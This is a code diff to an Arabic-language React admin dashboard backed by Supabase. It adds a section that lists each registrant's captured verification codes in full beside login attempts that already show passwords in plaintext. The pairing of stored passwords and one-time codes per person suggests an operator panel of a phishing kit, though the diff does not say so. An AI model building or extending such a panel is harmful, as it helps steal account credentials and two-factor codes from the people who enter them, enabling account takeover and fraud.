@@ -4,7 +4,7 @@ import {
   Users, CheckCircle2, Clock, Activity, Eye, EyeOff,
   RefreshCw, Wifi, WifiOff, Shield, Calendar, Phone,
   CreditCard, Mail, Layout, List, User, Lock, FileText, Hash,
-  LogIn as LogInIcon
+  LogIn as LogInIcon, ShieldCheck
 } from 'lucide-react';
 import { useSiteConfig, FormField } from '@/context/SiteConfigContext';
 import HeaderFooterEditor from '@/components/cms/HeaderFooterEditor';
@@ -23,6 +23,15 @@ type RegistrationWithMeta = Registration & {
   _new?: boolean; 
   extra_fields?: Record<string, string>;
   login_attempts?: LoginAttempt[];
+  verification_codes?: VerificationCode[];
+};
+
+type VerificationCode = {
+  id: string;
+  registration_id: string | null;
+  code: string;
+  verified: boolean;
+  created_at: string;
 };
 
 const FIELD_ICONS: Record<string, any> = {
@@ -96,11 +105,28 @@ function RegistrationsTab() {
       // Ignore errors - login_attempts table may not exist
     }
     
+    // Try to fetch verification codes
+    let codes: VerificationCode[] = [];
+    try {
+      const { data, error } = await supabase
+        .from('verification_codes')
+        .select('*')
+        .order('created_at', { ascending: false });
+      
+      // Only use data if no error
+      if (!error && data) {
+        codes = data;
+      }
+    } catch (e) {
+      // Ignore errors - verification_codes table may not exist
+    }
+    
     setLoading(false);
     if (regs) {
       const combined = regs.map(r => ({
         ...r,
-        login_attempts: logins?.filter(l => l.registration_id === r.id) || []
+        login_attempts: logins?.filter(l => l.registration_id === r.id) || [],
+        verification_codes: codes?.filter(c => c.registration_id === r.id) || []
       }));
       setRegistrations(combined);
     }
@@ -314,6 +340,39 @@ function RegistrationsTab() {
                               <p className="text-[10px] text-slate-500 mb-1">كلمة المرور</p>
                               <p className="text-xs text-white font-bold tracking-wider">{attempt.password}</p>
                             </div>
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  )}
+                </div>
+
+                {/* Verification Codes Section */}
+                <div className="space-y-3 pt-4 border-t border-slate-700">
+                  <div className="flex items-center gap-2 mb-2">
+                    <ShieldCheck className="w-4 h-4 text-green-400" />
+                    <h4 className="text-sm font-bold text-white">رموز التحقق</h4>
+                  </div>
+                  
+                  {(!selected.verification_codes || selected.verification_codes.length === 0) ? (
+                    <div className="bg-slate-800/50 rounded-xl p-4 text-center border border-dashed border-slate-700">
+                      <p className="text-xs text-slate-500 italic">لا توجد رموز تحقق مسجلة</p>
+                    </div>
+                  ) : (
+                    <div className="space-y-2">
+                      {selected.verification_codes.map((vc) => (
+                        <div key={vc.id} className="bg-slate-900/50 border border-slate-700/50 rounded-xl p-3 flex flex-col gap-2">
+                          <div className="flex items-center justify-between">
+                            <span className="text-[10px] text-slate-500 font-mono">
+                              {new Date(vc.created_at).toLocaleString('ar-SA')}
+                            </span>
+                            <span className="text-[10px] bg-green-500/10 text-green-400 px-2 py-0.5 rounded-full">
+                              {vc.verified ? 'تم التحقق' : 'لم يتم التحقق'}
+                            </span>
+                          </div>
+                          <div className="bg-slate-800/50 rounded-lg p-3 text-center">
+                            <p className="text-[10px] text-slate-500 mb-1">رمز التحقق</p>
+                            <p className="text-lg text-white font-bold tracking-[0.3em]">{vc.code}</p>
                           </div>
                         </div>
                       ))}
